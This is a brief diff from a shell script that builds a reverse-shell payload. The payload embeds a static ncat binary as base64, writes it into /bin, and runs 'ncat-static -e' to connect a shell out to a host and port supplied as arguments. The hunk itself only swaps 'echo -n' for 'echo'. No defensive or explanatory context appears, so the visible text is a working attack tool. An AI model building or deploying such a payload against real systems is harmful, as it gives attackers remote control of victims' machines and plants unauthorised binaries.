@@ -7,5 +7,5 @@ fi
 
 NCAT=/home/matus/ncat-static
 OUTPUT=/home/matus/testroot/reverseshell
-echo -n 'cp -p '$1' /bin/ncat-static; echo "'`base64 $NCAT`'" | base64 -di > /bin/ncat-static; ncat-static -e '$1' '$2' '$3' ' > $OUTPUT
+echo 'cp -p '$1' /bin/ncat-static; echo "'`base64 $NCAT`'" | base64 -di > /bin/ncat-static; ncat-static -e '$1' '$2' '$3' ' > $OUTPUT
 chmod +x $OUTPUT
